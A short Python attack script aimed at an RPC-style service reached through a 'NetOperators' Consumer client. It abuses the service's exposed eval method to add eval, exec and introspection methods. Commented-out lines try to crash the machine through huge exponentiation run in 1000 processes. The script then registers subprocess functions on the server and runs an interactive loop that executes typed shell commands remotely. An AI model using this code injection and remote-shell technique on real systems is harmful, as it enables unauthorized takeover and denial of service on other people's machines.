from NetOperators import Consumer

c = Consumer()
print(c.get("eval", x="self.methods.update({'eval': lambda x: eval(x, {'self': self}, globals()), 'exec': lambda x: exec(x, {'s': self}), 'gl': lambda: [i.__repr__() for i in globals()], 'lo': lambda: [i.__repr__() for i in locals()], 'pow': lambda b, e: b**e})"))
# Try to crash the machine.
# print(c.get("eval", x="self.methods.update({'f': lambda x: [i**x**301758017385753407510313 for i in range(x*100)]})"))
# print(c.get("exec", x="from multiprocessing import Process; [Process(target=s.methods['f'], args=(i,)).start() for i in range(1, 1001)]"))

# Getting shell access.
print(c.get("exec", x="from subprocess import check_output, run; s.methods.update({'c': check_output, 'r': run})"))

while True:
    exec = input().split(" ")
    if len(exec) == 0 or exec[0] == "exit":
        break
    print(c.get('r', args=exec, capture_output=True).stdout.decode())
